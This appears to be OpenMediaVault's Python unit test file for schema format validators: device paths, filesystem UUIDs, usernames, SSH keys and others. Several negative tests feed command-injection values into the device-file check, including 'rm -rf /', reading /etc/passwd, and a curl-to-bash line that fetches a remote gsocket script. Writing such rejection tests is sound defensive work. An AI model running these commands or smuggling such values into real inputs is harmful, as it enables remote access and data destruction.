# -*- coding: utf-8 -*-
#
# This file is part of OpenMediaVault.
#
# @license   https://www.gnu.org/licenses/gpl.html GPL Version 3
# @author    Volker Theile <volker.theile@openmediavault.org>
# @copyright Copyright (c) 2009-2026 Volker Theile
#
# OpenMediaVault is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# OpenMediaVault is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with OpenMediaVault. If not, see <https://www.gnu.org/licenses/>.
import unittest

import openmediavault.datamodel.schema
import openmediavault.json.schema


class SchemaTestCase(unittest.TestCase):
    def test_check_format_fsuuid_1(self):
        # EXT2/3/4, JFS, XFS
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "113dbaac-e496-11e6-ac68-73bc0f572bae",
            {"format": "fsuuid"},
            "field1",
        )

    def test_check_format_fsuuid_2(self):
        # FAT
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("7A48-BA97", {"format": "fsuuid"}, "field1")

    def test_check_format_fsuuid_3(self):
        # NTFS
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("2ED43920D438EC29", {
                             "format": "fsuuid"}, "field1")

    def test_check_format_fsuuid_3(self):
        # ISO9660
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "2015-01-13-21-48-46-00", {"format": "fsuuid"}, "field1"
        )

    def test_check_format_devicefile_1(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/sda1", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_2(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/disk/by-id/wwn-0x5020c298d81c1c3a",
            {"format": "devicefile"},
            "field1",
        )

    def test_check_format_devicefile_sata(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/sda", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_sata_partition(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/sdb2", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_nvme(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/nvme0n1", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_nvme_partition(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/nvme0n1p1", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_mmc(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/mmcblk0", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_mmc_partition(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/mmcblk0p1", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_md_raid(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/md0", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_md_raid_subdir(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/md/0", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_device_mapper(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/dm-0", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_lvm(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/mapper/data-lv",
                             {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_virtio(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/vda1", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_loop(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("/dev/loop0", {"format": "devicefile"}, "field1")

    def test_check_format_devicefile_by_id_ata(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/disk/by-id/ata-WDC_WD20EARX-00PASB0_WD-WMAZA2048027",
            {"format": "devicefile"},
            "field1",
        )

    def test_check_format_devicefile_by_uuid(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/disk/by-uuid/113dbaac-e496-11e6-ac68-73bc0f572bae",
            {"format": "devicefile"},
            "field1",
        )

    def test_check_format_devicefile_by_id_md_name(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/disk/by-id/md-name-vmpc01:data",
            {"format": "devicefile"},
            "field1",
        )

    def test_check_format_devicefile_by_id_md_uuid(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/disk/by-id/md-uuid-75de9de9:6beca92e:8442575c:73eabbc9",
            {"format": "devicefile"},
            "field1",
        )

    def test_check_format_devicefile_by_path(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/dev/disk/by-path/pci-0000:00:10.0-scsi-0:0:0:0",
            {"format": "devicefile"},
            "field1",
        )

    def test_check_format_devicefile_fail_semicolon_injection(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/dev/sda; id", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_rce_poc(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                '/dev/sda; GS_WEBHOOK_KEY=af946780 bash -c "$(curl -fsSL https://gsocket.io/x)"',
                {"format": "devicefile"},
                "field1",
            ),
        )

    def test_check_format_devicefile_fail_pipe_injection(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/dev/sda | cat /etc/passwd", {
                    "format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_and_injection(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/dev/sda && rm -rf /", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_subshell_injection(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/dev/sda$(id)", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_backtick_injection(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/dev/sda`id`", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_redirect_injection(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/dev/sda > /tmp/out", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_newline_injection(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/dev/sda\nid", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_variable_injection(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/dev/sda $USER", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_no_dev_prefix(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "sda", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_devicefile_fail_wrong_path(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/etc/passwd", {"format": "devicefile"}, "field1"
            ),
        )

    def test_check_format_dirpath_1(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "/media/a/b/c/@data", {"format": "dirpath"}, "field1"
        )

    def test_check_format_dirpath_2(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "Library/App Support/Logs/", {"format": "dirpath"}, "field1"
        )

    def test_check_format_dirpath_fail(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "/media/a/../../b/c", {"format": "dirpath"}, "field1"
            )
        )

    def test_check_format_sharename(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("data", {"format": "sharename"}, "field1")

    def test_check_format_sharename_fail_1(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                ".foo", {"format": "sharename"}, "field1"
            )
        )

    def test_check_format_sharename_fail_2(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "bar..foo", {"format": "sharename"}, "xyz"
            )
        )

    def test_check_format_domainname(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("test.com", {"format": "domainname"}, "field1")

    def test_check_format_domainname_fail_1(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "te:t#com", {"format": "domainname"}, "field1"
            )
        )

    def test_check_format_domainname_fail_2(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "x" * 65 + ".local", {"format": "domainname"}, "field1"
            )
        )

    def test_check_format_sshpubkey_openssh(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("ssh-rsa AAAAB3NzaC1yc2ADkcdByshQm577 bar@baz",
                             {"format": "sshpubkey-openssh"}, "foo")

    def test_check_format_sshpubkey_openssh_fail(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "sh-ra AAAAB3NzaC1yc2ADkcdByshQm577", {"format": "sshpubkey-openssh"}, "foo")
        )

    def test_check_format_sshpubkey_rfc4716(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "---- BEGIN SSH2 PUBLIC KEY ----\n"
            "AAAAB3NzaC1yc2EAAAABJQAAAQBZ9s5nqsH6bwB1ljF3DHBRs05PpeWIZEYnYRF5\n"
            "qU9YwfGHe6ZRXTpV/5XvSXvkIr3moKyXiCAzSD20yffEAXT7\n"
            "---- END SSH2 PUBLIC KEY ----",
            {"format": "sshpubkey-rfc4716"}, "bar")

    def test_check_format_sshpubkey_rfc4716_fail(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "---- BEGIN SSH2 PUBLIC KEY ----\n"
                "AAAAB3NzaC1yc2EAAAABJQAAAQBZ9s5nqsH6bwB1ljF3DHBRs05PpeWIZEYnYRF5\n"
                "qU9YwfGHe6ZRXTpV/5XvSXvkIr3moKyXiCAzSD20yffEAXT7\n",
                {"format": "sshpubkey-rfc4716"}, "bar"))

    def test_check_format_sshprivkey_rsa(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEogIBAAKCAQEAka7AN9KaHJnZ4huPlWhbaYJFIQ7AXKEZ5mpUWoa4yudmldSs\n"
            "xLB4BNdDK0Qj5QmgGVYJsywqriabe+OfSciUUpFO5+AIFTHoSQM=\n"
            "-----END RSA PRIVATE KEY-----",
            {"format": "sshprivkey-rsa"}, "foo")

    def test_check_format_sshprivkey_rsa_fail(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "---BEGIN RSA PRIVATE KEY----\n"
                "MIIEogIBAAKCAQEAka7AN9KaHJnZ4huPlWhbaYJFIQ7AXKEZ5mpUWoa4yudmldSs\n"
                "xLB4BNdDK0Qj5QmgGVYJsywqriabe+OfSciUUpFO5+AIFTHoSQM=\n"
                "-----END RSA PRIVATE KEY-----",
                {"format": "sshprivkey-rsa"}, "foo"))

    def test_check_format_netbiosname_1(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("WORKGROUP", {"format": "netbiosname"}, "field1")

    def test_check_format_netbiosname_2(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format(
            "F!OO-%&B^AR_", {"format": "netbiosname"}, "field1")

    def test_check_format_netbiosname_fail_1(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "REWARDEDIVANSNAS", {"format": "netbiosname"}, "field1"
            )
        )

    def test_check_format_netbiosname_fail_2(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "FOO]BAR", {"format": "netbiosname"}, "field1"
            )
        )

    def test_check_format_username_1(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("john", {"format": "username"}, "field1")

    def test_check_format_username_2(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("john.doe", {"format": "username"}, "field1")

    def test_check_format_username_3(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("_apt", {"format": "username"}, "field1")

    def test_check_format_username_4(self):
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("john123", {"format": "username"}, "field1")

    def test_check_format_username_5(self):
        # Samba machine accounts end with '$'.
        schema = openmediavault.datamodel.Schema({})
        schema._check_format("john$", {"format": "username"}, "field1")

    def test_check_format_username_fail_1(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "john doe", {"format": "username"}, "field1"
            )
        )

    def test_check_format_username_fail_2(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "-john", {"format": "username"}, "field1"
            )
        )

    def test_check_format_username_fail_3(self):
        schema = openmediavault.datamodel.Schema({})
        self.assertRaises(
            openmediavault.json.SchemaValidationException,
            lambda: schema._check_format(
                "john!", {"format": "username"}, "field1"
            )
        )


if __name__ == "__main__":
    unittest.main()
